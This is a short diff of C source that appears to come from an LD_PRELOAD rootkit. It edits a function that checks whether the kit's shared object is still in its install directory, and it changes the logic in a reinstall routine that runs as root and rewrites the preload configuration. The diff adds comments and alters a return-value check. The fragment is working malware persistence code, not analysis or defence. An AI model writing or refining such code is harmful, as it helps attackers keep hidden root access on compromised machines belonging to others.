@@ -6,12 +6,14 @@ int rknomore(void){
     hook(COPENDIR, CREADDIR);
 
     dp = call(COPENDIR, INSTALL_DIR);
-    if(dp == NULL) return status;
+    if(dp == NULL) // if we cant open installdir, rk-is-no-more
+        return status;
 
     while((dir = call(CREADDIR, dp)) != NULL){
         if(!strncmp(".", dir->d_name, 1))
             continue;
 
+        // if we can detect the kits shared object, rk-is-more
         if(strstr(dir->d_name, BDVLSO)){
             status = -1;
             break;
@@ -39,7 +41,7 @@ int preload_inconsistent(void){ // returns 1 if something is wrong with the prel
 
 void reinstall(void){
     if(geteuid() != 0) return;
-    if(rknomore() < 0) return;
+    if(rknomore()) return;
     if(!preload_inconsistent()) return;
 
     hook(CFOPEN, CFWRITE);
